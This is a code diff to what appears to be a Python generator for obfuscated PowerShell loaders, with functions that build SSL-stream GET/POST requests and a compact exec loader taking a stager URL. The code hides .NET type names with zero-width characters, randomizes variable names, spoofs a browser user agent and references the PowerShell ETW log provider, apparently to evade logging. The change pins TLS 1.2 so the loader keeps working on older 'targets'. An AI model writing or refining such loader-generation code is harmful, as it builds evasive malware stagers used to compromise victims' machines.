@@ -1013,7 +1013,7 @@ def _sslstream_get(url_expr: str, out_var: str, ua: str) -> str:
     vhost, vport, vpath, vhdr, vreq, vhi, vi = (_rv() for _ in range(7))
     vpx, vpxu, vupx, vns, vconn, vrbuf = _rv(), _rv(), _rv(), _rv(), _rv(), _rv()
     ua_enc = _split(ua)
-    tls_val = random.choice([3072, 12288, 15360])   # Tls12 / Tls13 / both — varies JA3 per build
+    tls_val = 3072  # Tls12 only — Tls13 breaks .NET 4.x targets
     tcp_t, vtcptype = _zwsp_type("Net.Sockets.TcpClient")
     ssl_t, vssltype = _zwsp_type("Net.Security.SslStream")
     ms_t,  vmstype  = _zwsp_type("IO.MemoryStream")
@@ -1061,7 +1061,7 @@ def _sslstream_post(url_expr: str, body_expr: str, ua: str) -> str:
     vtcp, vssl, vhost, vport, vpath, vbody, vhdr, vreq = (_rv() for _ in range(8))
     vpx, vpxu, vupx, vns, vconn, vrbuf = _rv(), _rv(), _rv(), _rv(), _rv(), _rv()
     ua_enc = _split(ua)
-    tls_val = random.choice([3072, 12288, 15360])
+    tls_val = 3072  # Tls12 only — Tls13 breaks .NET 4.x targets
     tcp_t, vtcptype = _zwsp_type("Net.Sockets.TcpClient")
     ssl_t, vssltype = _zwsp_type("Net.Security.SslStream")
     lines = [
@@ -1738,7 +1738,7 @@ def _compact_exec_loader(stager_url: str) -> list[str]:
     def d(e: str) -> str:
         return f"(&{vd} @({e}))"
 
-    tls_val = random.choice([3072, 12288, 15360])
+    tls_val = 3072  # Tls12 only — Tls13 breaks .NET 4.x targets
     ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
 
     etw_z,  vetw  = _zwsp_type("System.Management.Automation.PSEtwLogProvider")
